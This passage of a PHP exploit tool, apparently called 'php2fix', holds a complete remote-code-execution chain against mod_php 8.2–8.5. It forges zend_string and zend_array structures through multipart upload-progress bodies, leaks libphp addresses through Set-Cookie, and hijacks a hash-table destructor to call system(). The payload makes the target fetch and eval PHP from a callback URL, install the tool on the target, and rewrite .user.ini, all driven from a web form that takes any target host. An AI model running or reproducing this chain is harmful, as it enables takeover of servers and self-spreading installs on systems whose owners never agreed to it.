        for ($i = 0; $i < $nShallow; $i++) {
            $out .= p2f_part('files[s' . sprintf('%04d', $i) . '][x]', 'v');
        }
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', str_repeat('k', $prog));
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    /**
     * B1 (<= 8.4): 14 full-chunk fills carry a forged zend_string header at
     * chunk page `$page`; a 400-page fill leaves room, then 900 nested-array
     * fields create real HashTables whose pDestructor is zval_ptr_dtor, so the
     * OOB window contains libphp pointers and 2 MiB-aligned chunk headers.
     */
    public function b1Body(int $page, int $fakeLen, string $geom = 'G'): string
    {
        $out = p2f_part('PHPSESSID', 'a');
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');   // early, as measured
        if ($geom === 'G') {
            for ($i = 0; $i < 14; $i++) {
                $out .= p2f_part(substr(str_pad('f' . sprintf('%04d', $i), 120, 'f'), 0, 120),
                                 $this->forgeFill(511, $page, $fakeLen, $i));
            }
            $out .= p2f_part(substr(str_pad('f0014', 120, 'f'), 0, 120),
                             $this->forgeFill(400, $page, $fakeLen, 14));
            $out .= p2f_part(substr(str_pad('f0015', 120, 'f'), 0, 120),
                             $this->forgeFill(511, $page, $fakeLen, 15));
        } else {                     // 'A': fill stops exactly at the header
            for ($i = 0; $i < 16; $i++) {
                $out .= p2f_part(substr(str_pad('f' . sprintf('%04d', $i), 120, 'f'), 0, 120),
                                 $this->exactFill($page, $fakeLen, $i));
            }
        }
        for ($i = 0; $i < 900; $i++) {
            // the X-field index continues across the fills (16 of them), which
            // is what makes the hash tables land in the same slots as measured
            $out .= p2f_part('x' . sprintf('%05d', 16 + $i) . str_repeat('[a]', 12), 'v');
        }
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    private function forgeFill(int $pages, int $page, int $fakeLen, int $idx): string
    {
        $len = $pages * 4096 - 25;
        $v = str_repeat('A', $len);
        $this->putHeader($v, $page * 0x1000 - 0x1018, $fakeLen, $idx);
        return $v;
    }

    private function exactFill(int $page, int $fakeLen, int $idx): string
    {
        $hdr = $page * 0x1000 - 0x1018;
        $v = str_repeat('A', $hdr + 0x18 + 8);
        $this->putHeader($v, $hdr, $fakeLen, $idx);
        return $v;
    }

    private function putHeader(string &$v, int $off, int $fakeLen, int $idx): void
    {
        if ($off < 0 || $off + 0x20 > strlen($v)) {
            return;
        }
        p2f_put($v, $off + 0x00, p2f_u32(0));            // refcount 0
        p2f_put($v, $off + 0x04, p2f_u32(0x16));         // IS_STRING
        p2f_put($v, $off + 0x08, p2f_u64(0));            // h
        p2f_put($v, $off + 0x10, p2f_u64($fakeLen));     // len
        p2f_put($v, $off + 0x18, '/' . sprintf('%02d', $idx % 100) . 'BBBBB');
    }

    /** B1 (8.5): fills that end on `$page` and self-report every other page,
     *  so a wrong page is measured instead of silently accepted. */
    public function b1Body85(int $page, int $fakeLen): string
    {
        $out = p2f_part('PHPSESSID', 'a');
        $v = $this->hintedFill($page, $page, $fakeLen);
        for ($i = 0; $i < 16; $i++) {
            $out .= p2f_part(substr(str_pad('g' . sprintf('%04d', $i), 120, 'g'), 0, 120), $v);
        }
        for ($i = 0; $i < 900; $i++) {
            $out .= p2f_part('x' . sprintf('%05d', $i) . str_repeat('[a]', 12), 'v');
        }
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    /** Full-coverage measuring fill (8.5): every page reports its own index. */
    public function measure85(): string
    {
        $out = p2f_part('PHPSESSID', 'a');
        $v = $this->hintedFill(511, -1, 0);
        for ($i = 0; $i < 16; $i++) {
            $out .= p2f_part(substr(str_pad('m' . sprintf('%04d', $i), 120, 'm'), 0, 120), $v);
        }
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    /** value fill stopping at $endPage; page $hintPage gets `$fakeLen`, the
     *  others report 0x8000+page.  Both alignments are planted because 8.5's
     *  dangling struct is page aligned while 8.4's sits 0x18 before it. */
    private function hintedFill(int $endPage, int $hintPage, int $fakeLen): string
    {
        $len = $endPage * 4096 - 25;
        $v = str_repeat('A', $len);
        for ($k = 1; $k <= $endPage; $k++) {
            $flen = ($k === $hintPage) ? $fakeLen : 0x8000 + $k;
            $base = $k * 0x1000 - 0x1018;
            // the 8.5 shape uses one fixed tag here (the page is encoded in the
            // length instead), unlike the <= 8.4 fills which tag by index
            $this->putHeader($v, $base - 0x18, $flen, 0);
            $this->putHeader($v, $base, $flen, 0);
        }
        return $v;
    }

    /** A2 (<= 8.4): cheap OOM in the parser, leaves a zval reference dangling. */
    public function a2Body(int $parts, int $fillers = 115, int $depth = 64): string
    {
        $out = p2f_part('PHPSESSID', str_repeat('a', 32));
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
        for ($i = 0; $i < $fillers; $i++) {
            $out .= p2f_part(sprintf('%03d', $i), 'x');
        }
        for ($i = 0; $i < $parts; $i++) {
            $name = 'files[R' . sprintf('%05d', $i) . ']' . str_repeat('[a]', $depth - 2);
            $out .= '--' . P2F_BOUNDARY . "\r\nContent-Disposition: form-data; name=\""
                  . $name . "\"; filename=\"\""
                  . "\r\nContent-Type: application/octet-stream\r\n\r\n";
        }
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    /** B2 (<= 8.4): spray fake zend_reference values at the freed slot, plus an
     *  `ht` field carrying a fake zend_array whose pDestructor is zif_system. */
    public function b2Body(int $S, int $zif, string $cmd): string
    {
        $vl = 384;
        $spray = str_repeat('S', $vl);
        for ($o = 8; $o + 32 <= $vl; $o += 32) {
            p2f_put($spray, $o, p2f_u32(1) . "\x0a\x00\x00\x00"
                                 . p2f_u64($S) . p2f_u32(0x0107)
                                 . str_repeat("\x00", 12));
        }
        $ht = $this->fakeArray($S, $zif, $cmd, $vl);
        $out = '';
        for ($i = 0; $i < 500; $i++) {
            $out .= p2f_part(substr('s' . sprintf('%09d', $i) . str_repeat('x', 10), 0, 10), $spray);
        }
        $out .= p2f_part('ht', $ht);
        $out .= p2f_part('PHPSESSID', str_repeat('a', 32));
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
        for ($i = 0; $i < 495; $i++) {
            $out .= p2f_part(substr('t' . sprintf('%09d', $i) . str_repeat('x', 10), 0, 10), $spray);
        }
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    /** B2 (8.5): same idea, with the ring of refs starting at 8 and the PS(id)
     *  repair at 0x80 that keeps the worker alive past the call. */
    public function b2Body85(int $S, int $zif, string $cmd): string
    {
        $vl = 384;
        $spray = str_repeat('S', $vl);
        for ($o = 8; $o + 32 <= $vl; $o += 32) {
            p2f_put($spray, $o, p2f_u32(1) . "\x0a\x00\x00\x00"
                                 . p2f_u64($S) . p2f_u32(0x0107)
                                 . str_repeat("\x00", 12));
        }
        $hdr = str_repeat("\x00", 32);
        p2f_put($hdr, 0, p2f_u32(1));
        p2f_put($hdr, 4, p2f_u32(6));            // IS_STRING
        p2f_put($hdr, 16, p2f_u64(32));          // len
        p2f_put($spray, 0x80, $hdr);
        p2f_put($spray, 0x98, '0123456789abcdef0123456789abcdef');
        p2f_put($spray, 0xB8, "\x00");

        $ht = $this->fakeArray($S, $zif, $cmd, $vl);
        $out = '';
        for ($i = 0; $i < 500; $i++) {
            $out .= p2f_part('s' . sprintf('%09d', $i), $spray);
        }
        $out .= p2f_part('ht', $ht);
        $out .= p2f_part('PHPSESSID', str_repeat('a', 32));
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
        for ($i = 0; $i < 495; $i++) {
            $out .= p2f_part('t' . sprintf('%09d', $i), $spray);
        }
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    /** Fake zend_array at S: nTableSize/arData so zend_hash_destroy walks one
     *  element and calls pDestructor(arData) = zif_system(cmd). */
    private function fakeArray(int $S, int $zif, string $cmd, int $ln): string
    {
        // 0x98 bytes of header + command + NUL must fit inside the value that
        // lands at S; anything longer has to be refused loudly rather than
        // silently truncated.
        if (0x98 + strlen($cmd) + 1 > $ln) {
            throw new RuntimeException(sprintf(
                'payload too long for the ht value: %d + %d > %d bytes',
                0x98, strlen($cmd) + 1, $ln));
        }
        $ht = str_repeat("\x00", $ln);
        p2f_put($ht, 0x00, p2f_u32(1) . p2f_u32(7));
        p2f_put($ht, 0x08, p2f_u32(0x10) . p2f_u32(0xFFFFFFF8));
        p2f_put($ht, 0x10, p2f_u64($S + 0x20));          // arData
        p2f_put($ht, 0x18, p2f_u32(1) . p2f_u32(1));
        // 0x20 is the start of the fake execute_data (opline = 0), which in the
        // measured build overwrites nTableSize -- leave it zero, do not write 8.
        p2f_put($ht, 0x20, str_repeat("\x00", 8));
        p2f_put($ht, 0x28, p2f_u64(0));
        p2f_put($ht, 0x30, p2f_u64($zif));               // pDestructor
        $E = 0x20;
        p2f_put($ht, $E + 0x10, p2f_u64($zif));          // return_value
        p2f_put($ht, $E + 0x2C, p2f_u32(1));             // num_args
        p2f_put($ht, $E + 0x50, p2f_u64($S + 0x80));     // arg1
        p2f_put($ht, $E + 0x58, p2f_u32(6));             // IS_STRING
        p2f_put($ht, 0x80, p2f_u32(1) . p2f_u32(0x106));
        p2f_put($ht, 0x88, p2f_u64(0));
        p2f_put($ht, 0x90, p2f_u64(strlen($cmd)));
        p2f_put($ht, 0x98, $cmd);
        p2f_put($ht, 0x98 + strlen($cmd), "\x00");
        return $ht;
    }

    /* ------------------------------------------------------ leak parsing -- */


    /**
     * @return array{ok:bool, why:string, lib:int|null, decoded:int,
     *               cands:list<int>, all:list<int>, derived:int|null}
     */
    public function parseLeak(string $resp, int $dtorOff): array
    {
        $pos = strpos($resp, "Set-Cookie: PHPSESSID=");
        if ($pos === false) {
            return ['ok' => false, 'why' => 'no Set-Cookie (' . strlen($resp) . ' bytes)',
                    'lib' => null, 'decoded' => 0, 'cands' => [], 'all' => [],
                    'derived' => null];
        }
        $rest = substr($resp, $pos + 22);
        $nl = strpos($rest, "\r\n");
        $val = $nl === false ? $rest : substr($rest, 0, $nl);
        $dec = rawurldecode($val);
        $n = strlen($dec);
        $counts = [];
        for ($off = 0; $off + 8 <= $n; $off += 8) {
            $p = unpack('P', substr($dec, $off, 8))[1];
            if ($p >= 0x7f0000000000 && $p <= 0x7fffffffffff) {
                $counts[$p] = ($counts[$p] ?? 0) + 1;
            }
        }
        if ($counts === []) {
            return ['ok' => false, 'why' => "no heap pointers in $n decoded bytes",
                    'lib' => null, 'decoded' => $n, 'cands' => [], 'all' => [],
                    'derived' => null];
        }
        arsort($counts);
        $buckets = [];
        $libBucket = 0;
        foreach ($counts as $p => $c) {
            $b = $p & ~0x1FFFFF;
            $buckets[$b] = ($buckets[$b] ?? 0) + $c;
        }
        arsort($buckets);
        $top = array_key_first($counts);
        $lib = $top - $dtorOff;
        $libBucket = $top & ~0x1FFFFF;
        $idBucket = array_key_first($buckets);
        $cands = [];
        foreach ($buckets as $b => $c) {
            if ($b === $libBucket || $b === $idBucket) {
                continue;
            }
            $cands[] = ['b' => $b, 'c' => $c];
        }
        usort($cands, static function (array $x, array $y): int {
            return [abs($x['c'] - 87), $x['c']] <=> [abs($y['c'] - 87), $y['c']];
        });
        $list = [];
        foreach (array_slice($cands, 0, 3) as $e) {
            $list[] = $e['b'];
        }
        // libphp is mapped page aligned, not 2 MiB aligned: a real base looks
        // like 0x7f..c5000.  Requiring 2 MiB here silently throws away good
        // leaks (observed: lib=0x...c5000 rejected -> "no pointers").
        $topCount = $counts[$top];
        $ok = ($lib & 0xFFF) === 0 && $topCount >= 8;
        $all = [];
        foreach ($buckets as $b => $c) {
            $all[] = $b;
        }
        return ['ok' => $ok, 'why' => 'lib=' . p2f_hex($lib) . ' n=' . $topCount,
                'lib' => $lib, 'decoded' => $n, 'cands' => $list, 'all' => $all,
                'derived' => p2f_derive_H($counts)];
    }

    /** Identify the build from one leak: only the right zval_ptr_dtor offset
     *  turns the most common pointer into a 2 MiB aligned libphp base. */
    public function identify(string $resp): ?string
    {
        if ($this->version !== '' && isset(p2f_versions()[$this->version])) {
            return $this->version;
        }
        foreach (p2f_versions() as $name => $v) {
            $r = $this->parseLeak($resp, (int) $v['zdtor']);
            if ($r['ok']) {
                return $name;
            }
        }
        return null;
    }

    /* --------------------------------------------------------- plumbing --- */

    /** GET a path and return its body (bounded). */
    public function sendGet(string $path, int $max = 65536): string
    {
        $fp = $this->conn(10.0);
        if ($fp === null) {
            return '';
        }
        $this->writeAll($fp, 'GET ' . $path . " HTTP/1.1\r\nHost: {$this->host}:{$this->port}"
                            . "\r\nConnection: close\r\n\r\n");
        $resp = '';
        while (!feof($fp) && strlen($resp) < $max) {
            $c = @fread($fp, 8192);
            if ($c === false || $c === '') {
                break;
            }
            $resp .= $c;
        }
        @fclose($fp);
        $sp = strpos($resp, "\r\n\r\n");
        if ($sp === false || !preg_match('#^HTTP/1\.[01] 200#', $resp)) {
            return '';
        }
        return substr($resp, $sp + 4);
    }

    public function fetchMarker(): string
    {
        $fp = $this->conn(10.0);
        if ($fp === null) {
            return '';
        }
        $this->writeAll($fp, 'GET ' . $this->marker . " HTTP/1.1\r\nHost: "
                            . "{$this->host}:{$this->port}\r\nConnection: close\r\n\r\n");
        $resp = '';
        while (!feof($fp) && strlen($resp) < 65536) {
            $c = @fread($fp, 8192);
            if ($c === false || $c === '') {
                break;
            }
            $resp .= $c;
        }
        @fclose($fp);
        if (strncmp($resp, 'HTTP/1.1 200', 12) !== 0 && strncmp($resp, 'HTTP/1.0 200', 12) !== 0) {
            return '';
        }
        $sp = strpos($resp, "\r\n\r\n");
        return $sp === false ? '' : substr($resp, $sp + 4);
    }

    /** The command the chain runs on the target: fetch this page as PHP, install
     *  it, patch the running PHP, and leave a marker we can read back. */
    public function payload(): string
    {
        if ($this->cmd !== '') {
            return $this->cmd;
        }
        $src = $this->callback !== '' ? $this->callback : '';
        if ($src === '') {
            $src = 'http://127.0.0.1/php2fix.php';
        }
        $url = rtrim($src, '/') . (strpos($src, '?') === false ? '?txt' : '&txt');
        $dir = dirname($this->installPath);
        $code = '$u=' . var_export($url, true) . ';'
              . '$p=' . var_export($this->installPath, true) . ';'
              . '$s=@file_get_contents($u);'
              . '$how="none";'
              . 'if($s!==false&&strlen($s)>500){'
              .   '@file_put_contents($p,$s);@chmod($p,0644);$how="installed";}'
              . 'if(' . ($this->setMemoryLimit ? 'true' : 'false') . '){'
              .   '$ini="memory_limit=-1\nmax_execution_time=0\nmax_input_time=-1\n"'
              .   '."file_uploads=On\nsession.upload_progress.enabled=On\n"'
              .   '."enable_post_data_reading=On\n";'
              .   '@file_put_contents(' . var_export($dir . '/.user.ini', true) . ',$ini);'
              .   '$how.="+ini";}'
              . '@file_put_contents(' . var_export($dir . $this->marker, true) . ','
              .   '"p2f ".$how." php=".PHP_VERSION." pid=".getmypid().'
              .   '" host=".gethostname()." cwd=".getcwd());';
        // The command string travels inside the fake zend_string in the
        // 384-byte `ht` value, so it must stay under ~231 bytes.  Keep the URL
        // short (?d=1 uses the tool's defaults) and do not assume php is in PATH
        // or at a fixed location: ask the shell, then try the usual places.
        // Keep the query tiny: the installer defaults to the docroot and the
        // fixed marker name, so the common case needs only ?d=1 (the command
        // string must stay under ~231 bytes; 245 was refused by the guard).
        $default = $this->installPath === '/var/www/html/php2fix.php'
                && $this->marker === '/p2f-marker.txt';
        $q = 'd=1';
        if (!$default) {
            $q .= '&p=' . rawurlencode($this->installPath)
                . '&m=' . rawurlencode($this->marker);
        }
        if ($this->setMemoryLimit) {
            $q .= '&ini=1';
        }
        $url = rtrim($src, '/') . (strpos($src, '?') === false ? '?' : '&') . $q;
        // First statement leaves a breadcrumb: it separates "the destructor
        // called system() but the installer failed" from "system() was never
        // called" (the two cases look identical in the marker file).
        $crumb = 'echo x>>' . escapeshellarg(dirname($this->installPath) . '/p2f-fired') . ';';
        $cmd = 'P=$(command -v php || ls /usr/local/bin/php /usr/bin/php'
             . ' 2>/dev/null | head -1);'
             . $crumb
             . '$P -r ' . escapeshellarg('eval(file_get_contents('
             . var_export($url, true) . '));');
        if (strlen($cmd) > 200) {
            $this->say('    !! payload ' . strlen($cmd) . ' bytes (limit ~231)');
        }
        return $cmd;
    }

    /** @return list<resource> */
    public function heldCount(): array { return $this->held; }

    public function markerPath(): string { return $this->marker; }
}



/* ============================================================== driver === */

const P2F_QS_BASE = 'q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v';

function p2f_qs(int $vars): string
{
    if ($vars <= 0) {
        return '?' . P2F_QS_BASE;
    }
    $extra = [];
    for ($i = 0; $i < $vars; $i++) {
        $extra[] = sprintf('w%02d=', $i) . str_repeat('A', 26);
    }
    return '?' . implode('&', $extra) . '&' . P2F_QS_BASE;
}

/** Did this response hit memory_limit?  Monotone oracle used for calibration. */
function p2f_is_oom(string $resp): bool
{
    return strncmp($resp, 'HTTP/', 5) === 0
        && strpos(substr($resp, 0, strpos($resp, "\r\n") ?: 64), ' 500 ') !== false;
}

/**
 * A2 shape: the A stage must OOM *after* PS(http_session_vars) exists -- that
 * is what the B spray reclaims.  `parts` is the only control, and the boundary
 * moves when the child's heap baseline shifts (measured: 880 -> 864), so bisect
 * it against the OOM oracle instead of trusting a constant.
 */
function p2f_calibrate_a2(P2F $t, int $lo = 700, int $hi = 1000): int
{
    while ($lo < $hi) {
        $mid = intdiv($lo + $hi, 2);
        $r = $t->send('/index.php', $t->a2Body($mid), false, 8192);
        if (p2f_is_oom($r)) {
            $hi = $mid;
        } else {
            $lo = $mid + 1;
        }
    }
    $t->say('A2 boundary: parts=' . $lo);
    return $lo;
}

/**
 * Full chain.  Returns a report array:
 *   ['ok'=>bool, 'version'=>string, 'marker'=>string, 'why'=>string]
 */
function p2f_exploit(P2F $t): array
{
    $order = $t->version !== '' && isset(p2f_versions()[$t->version])
        ? [$t->version] : array_keys(p2f_versions());
    // one entry per known offset set: a version can have several builds
    $pairs = [];
    foreach ($order as $nm) {
        foreach (p2f_version_sets($nm) as $set) {
            $pairs[] = [$nm, $set];
        }
    }
    $why = 'no version matched';
    try {
        for ($attempt = 1; $attempt <= $t->retries; $attempt++) {
            foreach ($pairs as [$name, $v]) {
                $v = p2f_versions()[$name];
                $is85 = $v['chain'] === 'a2s';   // (set-specific below)
                $t->say('  refresh: crash every child -> cold workers');
                $t->refresh(static fn (): string => $is85
                    ? $t->b2Body85(0xdead0000, 0xdead0000, 'true')
                    : $t->b2Body(0xdead0000, 0xdead0000, 'true'));

                $a1 = $is85 ? $t->a1Body85(13, $v['a1']) : $t->a1Body($v['a1']);
                $info = ['ok' => false, 'why' => '', 'decoded' => 0];
                foreach ($t->gaps() as $gap) {
                    $t->say("try $attempt / $name: A1 (startup OOM, gap=$gap)");
                    $r = $t->send('/index.php' . p2f_qs((int) $v['qs']), $a1, true, 4096);
                    $t->say('  A1 -> ' . (p2f_is_oom($r) ? '500 (armed)' : 'not armed'));
                    $t->gap($gap);
                    usleep(120000);            // the reference client pauses here
                    if (!isset($page)) {
                        // 8.5: prefer a page measured earlier in this run; the
                        // struct is 0x1dc only on a freshly respawned child and
                        // 0x1e4 once exercised.
                        $page = (int) $v['page'];
                    }
                    $leakBody = $is85
                        ? $t->b1Body85($page, (int) $v['fake_len'])
                        : $t->b1Body($page, (int) $v['fake_len']);
                    $t->say("  B1 (Set-Cookie OOB read)");
                    $resp = $t->send('/index.php', $leakBody, true, 4 << 20, true, $t->stageTimeout);
                    $info = $t->parseLeak($resp, (int) $v['zdtor']);
                    if ($info['ok']) {
                        break;
                    }
                    $t->say('  leak failed: ' . $info['why']);
                }

                if (!$info['ok'] && $info['decoded'] > 0x8000) {
                    // A full-length cookie with no pointers means the fill itself
                    // covered the window (whole-chunk fills).  Re-arm and retry
                    // with the exact-stop geometry, which leaves the pages after
                    // the forged header untouched, so the X-field hash tables land
                    // there instead.
                    $t->say('  window was our own fill -> retry with A-geometry');
                    $t->send('/index.php' . p2f_qs((int) $v['qs']),
                             $t->a1Body($v['a1']), true, 4096);
                    $t->gap((int) $gap);
                    usleep(200000);
                    $resp = $t->send('/index.php',
                                     $t->b1Body((int) $v['page'], (int) $v['fake_len'], 'A'),
                                     true, 4 << 20);
                    $info = $t->parseLeak($resp, (int) $v['zdtor']);
                }
                if (!$info['ok']) {
                    $why = $info['why'];
                    $t->say('  leak failed: ' . $why);
                    if ($is85) {
                        // measure the page with the self-reporting body
                        $mp = $t->send('/index.php', $t->measure85(), true, 4 << 20);
                        $md = $t->parseLeak($mp, (int) $v['zdtor']);
                        if ($md['decoded'] > 0x8000 && $md['decoded'] < 0x8000 + 512) {
                            $page = $md['decoded'] - 0x8000;
                            $t->say('  page measured: ' . p2f_hex($page));
                            $t->send('/index.php', $t->a1Body85(13, $v['a1']), true, 4096);
                            $resp = $t->send('/index.php',
                                             $t->b1Body85($page, (int) $v['fake_len']),
                                             true, 4 << 20);
                            $info = $t->parseLeak($resp, (int) $v['zdtor']);
                        }
                    }
                    if (!$info['ok']) {
                        $why = $info['why'];
                        continue;
                    }
                }
                $lib = (int) ($_GET['lib'] ?? 0) ?: (int) $info['lib'];
                $zif = $lib + (int) $v['zif'];
                $t->say(sprintf('  leak OK: decoded=%d libphp=%s zif_system=%s',
                                $info['decoded'], p2f_hex($lib), p2f_hex($zif)));

                // <= 8.4: exactly the measured 880 parts (an off-by-one here
                // moves the OOM before PS(hash_serialize_verifier) exists, so
                // nothing dangles).  8.5: bisect, then use first_oom + 1.
                // The verified 8.5 driver (poc_8511.py) sends the *fixed* 880-part
                // A stage: it must OOM at one specific point so that
                // PS(http_session_vars) is left dangling.  "First OOM" (the
                // calibrated value, 864/865) OOMs too early and lands nowhere.
                $parts = 880;
                $payload = $t->payload();
                if (strlen($payload) < 900) {
                    $t->say('  payload: ' . $payload);
                } else {
                    $t->say('  payload: ' . substr($payload, 0, 120) . '...');
                }

                // Candidate order: <= 8.4 puts the "87-vote" bucket first (that is
                // a property of its leak shape); 8.5 walks the chunks in leak order
                // (measured: it is typically the 6th or 7th leaked chunk).
                // The libphp bucket can never be the main chunk, so drop it.
                $libBucket = $lib & ~0x1FFFFF;
                $ordered = $is85
                    ? array_merge($info['all'], $info['cands'])
                    : array_merge($info['cands'], $info['all']);
                $cands = array_values(array_unique(array_filter(
                    $ordered, static fn (int $b): bool => $b !== $libBucket)));
                if ($cands === []) {
                    $cands = [$lib & ~0x1FFFFF];
                }
                foreach ($cands as $H) {
                    $S = $H + (int) $v['soff'];
                    $t->say(sprintf('  A2+B2: H=%s S=%s', p2f_hex($H), p2f_hex($S)));
                    // A2's OOM keeps its child busy for a moment, so the write
                    // pair sits at a different queue offset than the leak pair:
                    // sweep it independently.
                    foreach ($t->gaps() as $wgap) {
                        $ra2 = $t->send('/index.php', $t->a2Body($parts), false, 8192, true, $t->stageTimeout);
                        $t->say(sprintf('    A2 parts=%d gap=%d -> %s', $parts, $wgap,
                                        p2f_is_oom($ra2) ? 'OOM' : substr($ra2, 0, 24)));
                        $t->gap($wgap);
                        usleep(350000);  // poc_8511.py pauses 0.35 s after A
                        $rb2 = $t->send('/index.php',
                                 $is85 ? $t->b2Body85($S, $zif, $payload)
                                       : $t->b2Body($S, $zif, $payload),
                                 false, 8192, true, $t->stageTimeout);
                        $t->say('    B2 resp=' . (int) strlen($rb2) . ' '
                                . substr($rb2, 0, 20));
                        usleep(600000);  // reference client: 0.6 s after B2
                        $mark = $t->fetchMarker();
                        if ($mark !== '') {
                            return ['ok' => true, 'version' => $name, 'marker' => $mark,
                                    'why' => 'marker ' . $t->markerPath()];
                        }
                    }
                }
                $why = 'chain ran, no marker (write did not land)';
            }
        }
    } catch (Throwable $e) {
        $why = $e->getMessage();
    }
    return ['ok' => false, 'version' => '', 'marker' => '', 'why' => $why];
}

/* ================================================================= UI === */

function p2f_h(?string $s): string
{
    return htmlspecialchars((string) $s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

/** Default callback URL: how the *target* can reach this page. */
function p2f_self_url(): string
{
    $scheme = 'http';
    if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) {
        $scheme = preg_split('/,/', (string) $_SERVER['HTTP_X_FORWARDED_PROTO'])[0];
    } elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
        $scheme = 'https';
    }
    $host = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_ADDR'] ?? '127.0.0.1');
    $path = $_SERVER['SCRIPT_NAME'] ?? '/php2fix.php';
    return $scheme . '://' . $host . $path;
}



$ran = null;
$opts = [
    'host' => (string) ($_POST['host'] ?? $_GET['host'] ?? '127.0.0.1'),
    'port' => (int) ($_POST['port'] ?? $_GET['port'] ?? 80),
    'path' => (string) ($_POST['path'] ?? '/index.php'),
    'version' => (string) ($_POST['version'] ?? ''),
    'gap' => (int) ($_POST['gap'] ?? 6),
    'retries' => (int) ($_POST['retries'] ?? 4),
    'callback' => (string) ($_POST['callback'] ?? ''),
    'installPath' => (string) ($_POST['installPath'] ?? '/var/www/html/php2fix.php'),
    'setMemoryLimit' => isset($_POST['run']) ? !empty($_POST['setMemoryLimit']) : true,
    'cmd' => (string) ($_POST['cmd'] ?? ''),
    'verbose' => true,
    'timeout' => (int) ($_POST['timeout'] ?? 180),
];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['run'])) {
    ignore_user_abort(true);
    set_time_limit(0);
    @ini_set('memory_limit', '-1');          // patch the running PHP
    @ini_set('max_execution_time', '0');
    // Stream the log instead of buffering it: mod_php holds ~4 KB (and gzip
    // another chunk) until the request ends, which made a slow hop look dead.
    while (ob_get_level() > 0) {
        @ob_end_flush();
    }
    @ini_set('output_buffering', '0');
    @ini_set('zlib.output_compression', '0');
    @ob_implicit_flush(true);
    $t = new P2F($opts);
    if ($t->callback === '') {
        $t->callback = p2f_self_url();
    }
    header_remove('Content-Type');
    header('Content-Type: text/html; charset=utf-8');
    echo "<!doctype html><meta charset=\"utf-8\"><title>php2fix</title>\n";
    echo "<h1>php2fix &mdash; running</h1>\n<pre style=\"white-space:pre-wrap\">";
    $ran = p2f_exploit($t);
    echo "\n\n" . ($ran['ok'] ? "== RCE OK ==" : "== failed ==") . "\n";
    echo 'target: ' . p2f_h($t->host) . ':' . $t->port . "\n";
    echo 'version: ' . p2f_h($ran['version'] !== '' ? $ran['version'] : '-') . "\n";
    echo 'requests: ' . $t->requests . "\n";
    echo 'why: ' . p2f_h($ran['why']) . "\n";
    if ($ran['marker'] !== '') {
        echo 'marker ' . p2f_h($t->markerPath()) . ":\n" . p2f_h($ran['marker']) . "\n";
        echo 'installed: ' . p2f_h($t->installPath) . "\n";
        echo 'patched: ' . ($t->setMemoryLimit ? dirname($t->installPath) . '/.user.ini' : 'no') . "\n";
    }
    echo "</pre><p><a href=\"\">back</a></p>";
    exit;
}

$self = p2f_self_url();
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>php2fix</title>
<style>
 body{font:15px/1.5 system-ui,sans-serif;max-width:52rem;margin:2rem auto;padding:0 1rem;color:#111}
 h1{font-size:1.4rem;margin:0 0 .2rem} p.sub{color:#555;margin:.2rem 0 1.4rem}
 form{display:grid;grid-template-columns:11rem 1fr;gap:.55rem .9rem;align-items:center}
 label{text-align:right;color:#333} input[type=text],input[type=number],select{width:100%;padding:.35rem .45rem;box-sizing:border-box}
 .row{grid-column:1/-1;display:flex;gap:1rem;align-items:center;flex-wrap:wrap;margin:.4rem 0}
 button{padding:.5rem 1.1rem;font-size:1rem;cursor:pointer}
 code,pre{background:#f4f4f5;padding:.1rem .3rem;border-radius:3px}
 .note{margin-top:1.6rem;color:#444}
 details{margin-top:1rem}
</style>
</head>
<body>
<h1>php2fix</h1>
<p class="sub">php2shell runner &mdash; POST runs the chain, the payload installs this page
 and patches the target's PHP.</p>
<p class="note" style="margin:0 0 1.2rem"><strong>Scope:</strong> this works only against
 <strong>mod_php</strong> (<code>apache2handler</code>) &mdash; <em>not</em> PHP-FPM, CGI or
 the built-in server, whose request-startup order differs and where the dangling-state
 chain does not exist. The page itself runs on PHP <strong>8.1 &ndash; 8.5</strong>; the
 targets it can currently drive are PHP 8.2, 8.3, 8.4 and 8.5 (8.1 needs its offsets
 learned first, see <code>?learn=</code>).</p>
<form method="post" action="">
  <label for="host">target host</label>
  <input type="text" id="host" name="host" value="<?= p2f_h($opts['host']) ?>">
  <label for="port">target port</label>
  <input type="number" id="port" name="port" min="1" max="65535" value="<?= p2f_h((string) $opts['port']) ?>">
  <label for="path">script path</label>
  <input type="text" id="path" name="path" value="<?= p2f_h($opts['path']) ?>">
  <label for="version">target build</label>
  <select id="version" name="version">
    <option value="">auto (from the leak)</option>
<?php foreach (array_keys(p2f_versions()) as $vn): ?>
    <option value="<?= p2f_h($vn) ?>"<?= $opts['version'] === $vn ? ' selected' : '' ?>><?= p2f_h($vn) ?></option>
<?php endforeach; ?>
  </select>
  <label for="gap">cycle offset sweep</label>
  <input type="number" id="gap" name="gap" min="0" max="16" value="<?= (int) $opts['gap'] ?>">
  <label for="callback">install source URL</label>
  <input type="text" id="callback" name="callback" value="<?= p2f_h($opts['callback'] !== '' ? $opts['callback'] : $self) ?>">
  <label for="installPath">install path</label>
  <input type="text" id="installPath" name="installPath" value="<?= p2f_h($opts['installPath']) ?>">
  <label for="retries">attempts</label>
  <input type="number" id="retries" name="retries" min="1" max="20" value="<?= p2f_h((string) $opts['retries']) ?>">
  <label for="cmd">payload override</label>
